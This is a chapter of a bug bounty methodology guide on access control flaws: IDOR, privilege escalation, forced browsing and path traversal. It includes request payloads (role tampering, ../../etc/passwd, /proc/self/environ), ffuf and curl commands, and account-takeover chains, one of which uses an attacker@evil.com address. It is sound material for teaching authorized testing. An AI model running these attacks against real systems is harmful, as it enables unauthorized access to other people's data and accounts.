---
title: "Part 3: Access Control — IDOR, BOLA, Privilege Escalation"
nav_order: 4
layout: default
---

## PART 3: ACCESS CONTROL — IDOR, BOLA, PRIVILEGE ESCALATION
*Status: COMPLETE — Iteration 3*

> **The mindset:** Access control is the single most common high-severity
> vulnerability class in bug bounty. IDOR alone accounts for a disproportionate
> share of Critical and High payouts. The reason it stays so common is that it
> cannot be found by a scanner — it requires a human who understands what the
> application is supposed to restrict, and then tests whether it actually does.
> Every object the application manages is a potential IDOR. Every role boundary
> is a potential privilege escalation.

---

### 3.1 IDOR Fundamentals

**What IDOR is:**
Insecure Direct Object Reference — when an application exposes a reference to an
internal object (database record, file, user account) and doesn't verify that the
requesting user is authorized to access that specific object.

The attacker changes the reference. The server returns someone else's data.

---

#### 3.1.1 Object Reference Types

🔍 **Not all references look like integers. Know all the forms:**

| Reference Type | Example | Notes |
|---------------|---------|-------|
| Numeric ID | `/api/invoice/1042` | Most obvious, still common |
| UUID/GUID | `/api/doc/550e8400-e29b-41d4-a716` | Not secure — see 3.1.4 |
| Hash (MD5/SHA1) | `/files/5f4dcc3b5aa765d61d8327deb` | Not secure — see 3.1.4 |
| Username | `/profile/john.doe` | Swap username in URL |
| Email | `/api/user?email=victim@x.com` | Direct email enumeration |
| Filename | `/download?file=report_1042.pdf` | Path traversal also possible |
| Encoded value | `/api/obj/dXNlcl8xMDQy` | Base64 decode it first |
| Indirect (slug) | `/api/invoice/march-2026` | Predictable from pattern |

**Always decode before testing:**
```bash
# Base64:
echo "dXNlcl8xMDQy" | base64 -d
# user_1042 → numeric ID was just encoded

# URL encoded:
python3 -c "import urllib.parse; print(urllib.parse.unquote('user%5F1042'))"

# JWT payload (contains object references):
echo "<payload_part>" | base64 -d
```

---

#### 3.1.2 Where IDORs Live

🔍 **Exhaustive list of locations — check every one:**

```
URL path parameters:
GET /api/users/1042/profile
GET /documents/download/5523
GET /invoices/march-2026/export

Query string parameters:
GET /dashboard?user_id=1042
GET /report?account=5523&format=pdf
GET /notifications?recipient=john.doe

Request body (POST/PUT/PATCH):
{"user_id": 1042, "action": "delete"}
{"document_id": "550e8400...", "share": true}
{"account_number": "5523", "amount": 100}

HTTP headers:
X-User-ID: 1042
X-Account-ID: 5523
X-Org-ID: 99

Cookies:
user_id=1042
account=5523

Indirect — referenced in response, sent back in next request:
Step 1: GET /cart → response contains {"cart_id": "abc123"}
Step 2: POST /checkout {"cart_id": "abc123"} ← swap this
```

**The key question for every parameter:** *Does changing this value to another
user's equivalent give me access to their data or actions?*

---

#### 3.1.3 The Two-Account Testing Methodology

🔍 **This is the correct way to test IDOR — always use two accounts:**

```
Account A: attacker (you control this)
Account B: victim (you also control this — second test account)

Setup:
1. Log in as Account B, create some data: upload a file, create a document,
   place an order, send a message. Note the object IDs.
2. Log in as Account A
3. Attempt to access Account B's objects using Account A's session
4. If Account A can access Account B's data → IDOR confirmed

Why two accounts:
- You always have a valid ID to test with (Account B's real object IDs)
- You can confirm exactly what data was accessed
- You can demonstrate the impact clearly in the report
- No risk of accidentally accessing real user data
```

**In Burp — the Autorize workflow:**
```
1. Install Autorize extension (BApp Store)
2. Log in as Account A (low privilege) → copy session cookie to Autorize
3. Log in as Account B (also low privilege, or higher privilege)
4. Browse the app as Account B — Autorize automatically replays every
   request using Account A's session
5. Autorize flags requests where Account A gets a 200 with similar
   response body to Account B → IDOR candidate
6. Manually verify each flag
```

---

#### 3.1.4 UUID and Hash-Based IDOR

🔍 **The misconception:**
Many developers believe UUIDs and hashed IDs are security controls.
They are not. They are only obscurity. If the UUID or hash is discoverable
through any other means, the IDOR is just as exploitable.

**How to find UUIDs belonging to other users:**

```
1. API responses that list other users' UUIDs:
   GET /api/org/members → returns [{user_id: "550e8400...", name: "Alice"}, ...]
   Now test: GET /api/users/550e8400.../private-data

2. Error messages that reveal IDs:
   "Access denied to document 550e8400-e29b-41d4-a716"
   → UUID is now known, test from another account

3. Predictable UUID versions:
   UUID v1 is time-based and sequential — can be predicted
   Check: if IDs look like 550e8400-e29b-11e?-... → UUIDv1

4. Hash-based IDs from predictable input:
   /files/5f4dcc3b5aa765d61d8327deb882cf99
   → MD5 of "password" → hash of predictable filename?
   Test: md5sum <<< "report_2026.pdf"

5. Search all API responses for UUIDs:
   # Collect all responses via Burp and grep:
   grep -rE "[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}" \
     burp_responses/ | sort -u
```

---

### 3.2 Finding IDORs at Scale

---

#### 3.2.1 Burp Autorize — Automated Horizontal Privilege Check

🔍 **Full setup:**
```
1. Install Autorize from BApp Store
2. Open Autorize tab → paste low-privilege user's session cookie/token
3. Log in as a different user (can be same privilege level)
4. Browse the application — visit all functionality:
   - Profile settings
   - Documents, files, invoices
   - Account management
   - API endpoints
   - Admin features (even if redirected away)
5. Autorize shows three columns:
   - Original request (high/normal priv)
   - Replayed with low-priv cookie
   - Unauthenticated (no cookie)
6. Status: "Bypassed!" = same response body → manual verify
7. Status: "Enforced!" = different response (smaller, 403, etc.) → not vulnerable
8. Status: "Is enforced???" = needs manual review (ambiguous)
```

**Autorize configuration for better results:**
```
- Set "Ignore headers" for: Cookie, Authorization, X-CSRF-Token
  (so only these get swapped, not all headers)
- Add a "Filtered strings" pattern for your low-priv user's own data
  (so it doesn't flag access to your own objects as bypasses)
- Set interception filter to only test authenticated endpoints
```

---

#### 3.2.2 Manual Flow Mapping for Access Control

🔍 **What to do:**
Autorize catches horizontal IDORs but misses:
- Vertical privilege escalation (low user → admin actions)
- State-based access (actions only valid in certain states)
- Indirect IDORs (ID in one step references object in later step)

Manual mapping approach:
```
For each application feature, ask:
1. What object does this operate on?
2. Who is supposed to have access?
3. Where is the object reference in the request?
4. What happens if I change it?

Build a table:
Feature         | Object      | Reference Location    | Tested?
----------------|-------------|----------------------|--------
View invoice    | invoice_id  | GET /api/invoice/ID  | ✓
Delete document | doc_id      | POST body            | ✓
Export report   | account_id  | Query param          | ✓
Share file      | file_uuid   | Request body         | ✓
View audit log  | org_id      | Header               | ✓
```

---

#### 3.2.3 Chaining IDOR for Severity Uplift

🔍 **Turning read IDORs into account takeover:**

```
Read IDOR on email address:
→ GET /api/users/1043 returns {"email": "victim@target.com"}
→ Alone: Medium severity
→ Chain: trigger password reset for victim@target.com
→ Combined: Account Takeover = Critical

Read IDOR on password reset token:
→ GET /api/users/1043/reset-token returns {"token": "abc123"}
→ Use token to reset victim's password → ATO

Read IDOR on MFA backup codes:
→ GET /api/users/1043/backup-codes returns ["12345678", ...]
→ Use backup code to bypass MFA → ATO

Write IDOR → change victim's email:
→ PUT /api/users/1043 {"email": "attacker@evil.com"}
→ Trigger password reset to new email → ATO
```

**Always ask:** *What's the worst thing I can do with this IDOR?*
A read IDOR on a user's email is not just information disclosure —
it's the first step in an account takeover chain.

---

### 3.3 Vertical Privilege Escalation

**What it is:**
A lower-privileged user performing actions or accessing data reserved for
higher-privileged users (user → admin, user → moderator, free → premium).

---

#### 3.3.1 Role Parameter Tampering

🔍 **What to look for:**
```
Registration or profile update requests that include a role parameter:
POST /api/register
{"username": "attacker", "email": "x@x.com", "password": "x", "role": "user"}
                                                                    ↑
                                                              Try changing to "admin"

Account update:
PUT /api/users/me
{"email": "x@x.com", "role": "user"}  → change to "admin"

JWT claim (see 2.3.5):
{"user_id": 123, "role": "user"}  → forge as "admin"

Cookie value:
role=user  →  role=admin (if not signed)
isAdmin=false  →  isAdmin=true
```

**Mass assignment vector (see also 7.2.3):**
```bash
# Normal request:
PUT /api/profile {"display_name": "John"}

# Add undocumented fields:
PUT /api/profile {"display_name": "John", "role": "admin", "is_admin": true, "plan": "enterprise"}

# Tools that automate this:
# Param Miner — discovers hidden parameters
# Burp Intruder — fuzz parameter names from SecLists
```

---

#### 3.3.2 Accessing Admin Endpoints as Regular User

🔍 **What to do:**
Admin functionality often exists at predictable paths. Test access to these
paths with a regular user session — the UI may hide the links but the
server may not enforce the access control.

```bash
# Fuzz for admin paths with authenticated regular-user session:
ffuf -u https://target.com/FUZZ \
  -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt \
  -H "Cookie: session=<regular_user_session>" \
  -mc 200,201,301,302 \
  -o admin_endpoints.txt

# Specific admin path wordlist:
ffuf -u https://target.com/FUZZ \
  -w /opt/SecLists/Discovery/Web-Content/api-endpoints.txt \
  -H "Authorization: Bearer <regular_user_token>" \
  -mc 200,201,400  # 400 = endpoint exists but bad request
```

**Admin endpoints commonly missed:**
```
/admin, /admin/, /administrator, /admin/panel
/api/admin/users, /api/admin/config, /api/admin/stats
/api/v1/admin/*, /api/internal/*
/management, /manage, /console
/staff, /superuser, /root
/_admin, /_internal, /_debug
/api/users?admin=true (parameter-based admin view)
```

**Function-level bypass — HTTP method:**
```bash
# Endpoint returns 403 to GET — try other methods:
curl -X POST https://target.com/admin/users/delete/1042 \
  -H "Cookie: session=<regular_user>"
curl -X PUT https://target.com/admin/users/1042 \
  -H "Cookie: session=<regular_user>"
curl -X DELETE https://target.com/admin/users/1042 \
  -H "Cookie: session=<regular_user>"
# Different method → different code path → different access check
```

---

#### 3.3.3 Forced Browsing and State Bypass

🔍 **What to do:**
Multi-step processes (onboarding, checkout, verification) often check state
at each step — but some steps only check that the previous step was visited,
not that it was completed successfully.

```
Normal flow:
Step 1: /verify-email → Step 2: /set-password → Step 3: /complete-profile → /dashboard

Attack:
Skip directly to Step 3 or /dashboard without completing Step 1 or 2
Test: does the app verify email is confirmed before granting access?

Checkout bypass:
/checkout/step1 (cart review) → /checkout/step2 (payment) → /checkout/step3 (confirm)
Skip step2 (payment) → navigate directly to /checkout/step3
Does it complete the order without payment?

Verification skip:
POST /api/verify-phone {"code": "123456"} → fails
Navigate directly to /dashboard
Does the app require verified phone, or just that the step was visited?
```

---

### 3.4 Indirect Object References

---

#### 3.4.1 Email and Username as References

🔍 **These are IDORs too — just less obvious:**

```
Password reset with email parameter:
POST /api/password-reset {"email": "attacker@x.com"}  → normal
POST /api/password-reset {"email": "victim@target.com"}  → sends reset to victim

Notification preferences via email:
GET /api/unsubscribe?email=attacker@x.com  → your own
GET /api/unsubscribe?email=victim@target.com  → unsubscribes victim (account disruption)

Profile lookup via username:
GET /api/profile?username=attacker  → your profile
GET /api/profile?username=admin  → admin's profile data

Message/notification via user handle:
POST /api/message {"to": "john.doe"}
→ Can you enumerate all users by varying the handle?
→ Can you send messages as another user by changing the "from" field?
```

---

#### 3.4.2 File Path Traversal as IDOR Variant

🔍 **When the object reference is a filename:**
```
GET /api/files/download?name=myreport.pdf
→ Try: name=../myreport.pdf
→ Try: name=../../etc/passwd
→ Try: name=../users/admin/private.pdf
→ Try: name=..%2Fusers%2Fadmin%2Fprivate.pdf (encoded)

POST /api/export {"template": "invoice.html"}
→ Try: {"template": "../../../etc/passwd"}
→ Try: {"template": "../../../../proc/self/environ"}
```

→ See also [5.4 Local File Inclusion / Path Traversal](#54-local-file-inclusion--path-traversal)

---

### 3.5 IDOR Impact Escalation

---

#### 3.5.1 Assessing and Presenting IDOR Severity

🔍 **The severity of an IDOR is determined by what it exposes or enables,
not by the fact that it exists. Use this framework:**

| IDOR Type | Example Impact | Typical Severity |
|-----------|---------------|-----------------|
| Read — public data | Other user's display name | Informational/Low |
| Read — PII | Email, phone, address, DOB | Medium-High |
| Read — sensitive data | Payment cards, SSN, medical records | High-Critical |
| Read — credentials/tokens | Password reset token, API key | Critical |
| Write — own data modified | Change your own plan/role | Medium |
| Write — other user's data | Change victim's email/password | High-Critical |
| Delete — other user's objects | Delete victim's files/account | High |
| Action — on behalf of user | Post as victim, transfer funds | Critical |

**Mass IDOR — when one bug affects all users:**
```
GET /api/users/{id}/export
→ Test with sequential IDs: 1, 2, 3, ...100
→ If all return PII: this isn't a single-user IDOR, it's mass data exposure
→ Report this as Critical: "Full user database enumerable via IDOR"
→ Include count of potentially affected users in impact statement
```

---

#### 3.5.2 Writing the IDOR Report

📝 **What separates a paid IDOR report from a rejected one:**

**Title formula:**
```
IDOR in [feature/endpoint] allows [actor] to [impact] via [parameter]

Examples:
"IDOR in /api/invoices/{id} allows any authenticated user to read
 other users' invoices via numeric ID manipulation"

"IDOR in document export endpoint allows account takeover via
 predictable document_id parameter"
```

**The impact statement — write this first, then everything else:**
```
An authenticated attacker with a free account can enumerate all user invoices
by incrementing the invoice_id parameter. Each invoice contains full billing
information including name, address, and last 4 digits of payment card.
With approximately 50,000 users, this exposes PII for the entire user base.
```

**Reproduction steps — write for a developer with no security knowledge:**
```
1. Create two accounts: Account A (attacker) and Account B (victim)
2. Log in as Account B and create an invoice. Note the invoice ID in the URL: /invoice/5523
3. Log in as Account A
4. Send the following request:
   GET /api/invoice/5523 HTTP/1.1
   Host: target.com
   Cookie: session=<Account_A_session>
5. Observe: the response returns Account B's full invoice data despite Account A
   having no legitimate access to Account B's resources.
```

**Evidence:**
- Raw HTTP request and response (with victim's data highlighted)
- Screenshot or video of the exploit (video dramatically increases acceptance rate)
- For mass IDOR: show a range of IDs all returning different users' data

**Suggested remediation:**
```
Implement server-side ownership verification before returning any object.
Verify that the requesting user's ID matches the owner_id field of the
requested resource. Do not rely on obscurity of IDs.
```

🔗 **See also:** [Part 11: Reporting Mastery](#part-11-reporting-mastery) for
full report templates and severity calibration.

---

### 3.6 Access Control Testing Checklist

```
IDOR — HORIZONTAL (same privilege, different user)
□ Every numeric ID in URL paths — increment/decrement
□ Every ID in request body parameters
□ Every ID in query string parameters
□ Every ID in custom headers (X-User-ID, X-Account-ID)
□ Cookie values that contain IDs or references
□ UUIDs in responses — are they used in subsequent requests?
□ Hash-based IDs — predictable from known input?
□ Encoded values (base64, URL-encoded) — decode and analyze
□ Autorize running during full manual app walkthrough
□ Two-account methodology: Account B's IDs tested from Account A

IDOR — WRITE OPERATIONS (higher impact)
□ PUT/PATCH/DELETE on object IDs — can you modify/delete others' objects?
□ Action endpoints: /share, /transfer, /export, /delete with ID params
□ File operations: download?file=, template=, export?document=

IDOR → ATO CHAINS
□ Read IDOR on email/phone → trigger password reset → ATO
□ Read IDOR on reset token → use token → ATO
□ Write IDOR on email field → change to attacker email → reset → ATO
□ Read IDOR on MFA codes → bypass MFA

VERTICAL PRIVILEGE ESCALATION
□ Role/admin parameters in registration or profile update
□ Mass assignment: add role/admin/plan fields to any PUT/PATCH
□ Admin endpoints accessible with regular session (ffuf + auth cookie)
□ HTTP method swap on 403'd admin endpoints
□ Multi-step flow: can steps be skipped? Can step 2 be reached without step 1?

INDIRECT REFERENCES
□ Email as object reference — change email param to victim's
□ Username as object reference
□ Filename as reference — path traversal variant
□ Slug/readable ID — predictable from naming pattern

IMPACT ASSESSMENT
□ What is the worst action possible with this IDOR?
□ Is this mass-exploitable (all user IDs sequential)?
□ Does it expose PII, credentials, payment data, or enable ATO?
□ Is the write version also vulnerable (not just read)?
```

📚 **Part 3 References:**
- [PortSwigger — Access control vulnerabilities](https://portswigger.net/web-security/access-control)
- [PortSwigger — IDOR](https://portswigger.net/web-security/access-control/idor)
- [Autorize (BApp Store)](https://portswigger.net/bappstore/f9bbac8c4acf4aefa4d7dc92a991af2f)
- [OWASP — Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [PayloadsAllTheThings — IDOR](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References)
- [HackTricks — IDOR](https://book.hacktricks.xyz/pentesting-web/idor)

---

